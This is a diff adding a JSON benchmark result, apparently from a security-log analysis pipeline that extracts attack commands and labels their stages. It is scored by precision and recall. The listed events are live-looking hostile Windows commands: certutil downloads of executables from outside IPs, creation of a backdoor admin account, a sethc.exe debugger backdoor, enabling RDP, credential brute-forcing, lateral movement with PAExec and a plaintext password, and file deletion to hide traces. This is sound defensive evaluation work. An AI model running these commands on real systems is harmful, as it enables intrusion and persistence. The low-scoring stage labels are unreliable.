@@ -1,0 +1,148 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd  /c \"cd /d \\\"D:/phpStudy/WWW\\\"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd  /c \"cd /d \\\"D:/phpStudy/WWW\\\"&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill  /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil  -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd  /c python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd  /c python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd  /c python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd  /c WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /q WinBrute.exe && del /f /q administrator_pass.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "advfirewall firewall add rule \"name=Remote Desktop\" dir=in action=allow protocol=TCP localport=3389",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "nbtscan.exe 192.168.0.244/24",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q nbtscan.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "del /f /q PAExec.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd  /c \"cd /d \\\"D:/phpStudy/WWW\\\"&C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\"",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attack begins with an initial access through `certutil`, downloading two different executables. The downloaded executable (`ywm.exe`) serves as part of the execution phase, establishing persistence through further downloads and starting processes disguised within legitimate-looking commands. Various attempts to escalate privileges include creating new admin users and changing firewall rules. Tools like Python scripts are employed to collect sensitive data and discover network resources. Other activities focus on moving laterally between machines, using brute force attacks and remote execution utilities. There are clear efforts made throughout to evade detection by cleaning up files and logs.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 24423,
+      "completion_tokens": 5444,
+      "total_tokens": 29867,
+      "wall_clock_s": 99.01,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.4166666666666667,
+      "recall": 0.9090909090909091,
+      "f1": 0.5714285714285715,
+      "tp": 10,
+      "fp": 14,
+      "fn": 1
+    },
+    "stage": {
+      "precision": 0.16666666666666666,
+      "recall": 0.6666666666666666,
+      "f1": 0.26666666666666666,
+      "tp": 4,
+      "fp": 20,
+      "fn": 2,
+      "recall_partial": 0.75
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 24423,
+      "completion_tokens": 5444,
+      "total_tokens": 29867,
+      "wall_clock_s": 99.01,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
